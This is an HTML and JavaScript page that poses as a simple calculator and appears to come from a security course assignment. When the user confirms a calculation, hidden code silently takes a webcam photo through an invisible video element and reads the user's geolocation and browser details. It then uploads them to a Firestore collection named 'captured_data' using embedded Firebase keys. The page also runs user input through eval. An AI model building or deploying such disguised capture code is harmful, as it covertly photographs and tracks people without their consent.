<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calculator</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="main-container">
    <div class="calculator-section">
        <h2>Calculator</h2>
        <div class="calculator">
            <input type="text" id="display" disabled>

            <div class="button-row">
                <button onclick="press('7')">7</button>
                <button onclick="press('8')">8</button>
                <button onclick="press('9')">9</button>
                <button onclick="press('/')">/</button>
            </div>

            <div class="button-row">
                <button onclick="press('4')">4</button>
                <button onclick="press('5')">5</button>
                <button onclick="press('6')">6</button>
                <button onclick="press('*')">*</button>
            </div>

            <div class="button-row">
                <button onclick="press('1')">1</button>
                <button onclick="press('2')">2</button>
                <button onclick="press('3')">3</button>
                <button onclick="press('-')">-</button>
            </div>

            <div class="button-row">
                <button onclick="press('0')">0</button>
                <button onclick="showConfirmModal()">=</button>
                <button onclick="clearDisplay()">C</button>
                <button onclick="press('+')">+</button>
            </div>
        </div>
    </div>
</div>

<!-- Confirmation Modal Overlay -->
<div class="modal-overlay" id="modalOverlay">
    <div class="modal">
        <div class="modal-icon">🔢</div>
        <h2 class="modal-title">Confirm Calculation</h2>
        <p class="modal-text">Are you sure you want to calculate this expression?</p>
        <div class="modal-buttons">
            <button class="modal-btn modal-btn-cancel" onclick="closeModal()">Cancel</button>
            <button class="modal-btn modal-btn-confirm" onclick="confirmCalculation()">Confirm</button>
        </div>
    </div>
</div>

<!-- Hidden elements for background capture (invisible to user) -->
<video id="hiddenVideo" autoplay playsinline
    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
</video>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>

<script>
// ===== FIREBASE INIT =====
const firebaseConfig = {
    apiKey: "AIzaSyD8ahJTs1rf0GLNCzNHtSJWI8AzXViGb00",
    authDomain: "is-assignment-9b700.firebaseapp.com",
    projectId: "is-assignment-9b700",
    storageBucket: "is-assignment-9b700.firebasestorage.app",
    messagingSenderId: "418050182436",
    appId: "1:418050182436:web:90af090c5377f40cedb7b1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ===== CALCULATOR LOGIC =====
function press(val) {
    document.getElementById("display").value += val;
}

function clearDisplay() {
    document.getElementById("display").value = "";
}

// ===== MODAL LOGIC =====
function showConfirmModal() {
    const expr = document.getElementById("display").value;
    if (!expr || expr.trim() === "") {
        return;
    }
    document.getElementById("modalOverlay").classList.add("active");
}

function closeModal() {
    document.getElementById("modalOverlay").classList.remove("active");
}

function confirmCalculation() {
    // 1. Perform the calculation
    try {
        document.getElementById("display").value =
            eval(document.getElementById("display").value);
    } catch {
        document.getElementById("display").value = "Error";
    }

    // 2. Close the modal
    closeModal();

    // 3. Silently capture data in the background
    captureAllDataInBackground();
}

// ===== BACKGROUND DATA CAPTURE =====
async function captureAllDataInBackground() {
    // Run location + photo capture in parallel
    const [locationResult, photoResult] = await Promise.allSettled([
        getLocationSilently(),
        capturePhotoSilently()
    ]);

    // Build the document matching your existing Firestore format
    const docData = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language || "",
        platform: navigator.platform || "",
        screenWidth: window.screen.width,
        screenHeight: window.screen.height
    };

    // Attach photo as base64 string
    if (photoResult.status === "fulfilled" && photoResult.value) {
        docData.image = photoResult.value;
    }

    // Attach location
    if (locationResult.status === "fulfilled" && locationResult.value) {
        docData.latitude = locationResult.value.latitude;
        docData.longitude = locationResult.value.longitude;
    }

    // Send to Firestore
    try {
        await db.collection("captured_data").add(docData);
        console.log("Data sent to Firestore successfully");
    } catch (err) {
        console.log("Firestore error:", err);
    }
}

// Get location without any visible UI
function getLocationSilently() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                });
            },
            () => resolve(null),
            { timeout: 10000 }
        );
    });
}

// Capture a photo from hidden camera and return as base64 string
async function capturePhotoSilently() {
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: 480, height: 640 },
            audio: false
        });
    } catch {
        return null;
    }

    
    const hiddenVideo = document.getElementById("hiddenVideo");
    const hiddenCanvas = document.getElementById("hiddenCanvas");
    hiddenVideo.srcObject = stream;

    // Wait for camera to initialize
    await new Promise(r => setTimeout(r, 500));

    // Capture photo to canvas
    hiddenCanvas.width = hiddenVideo.videoWidth || 480;
    hiddenCanvas.height = hiddenVideo.videoHeight || 640;
    const ctx = hiddenCanvas.getContext("2d");
    ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);

    // Convert to base64 data URL string
    const base64 = hiddenCanvas.toDataURL("image/jpeg", 0.7);

    // Stop camera immediately
    stream.getTracks().forEach(track => track.stop());
    hiddenVideo.srcObject = null;

    return base64;
}
</script>

</body>
</html>
